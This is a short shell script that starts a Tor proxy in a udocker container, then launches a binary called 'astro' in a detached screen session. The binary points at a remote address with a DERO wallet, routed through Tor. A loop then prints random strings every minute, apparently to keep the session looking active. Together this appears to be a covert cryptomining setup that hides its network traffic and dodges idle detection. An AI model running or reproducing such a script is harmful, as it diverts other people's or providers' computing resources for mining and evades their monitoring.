udocker run -p 127.0.0.1:9050:9050 timms/tor-proxy-rapid-ip-rotation &
sleep 2m
screen -dmS my ./astro -r 5.161.123.196:10100 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj -p rpc -sock-address 127.0.0.1:9050
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
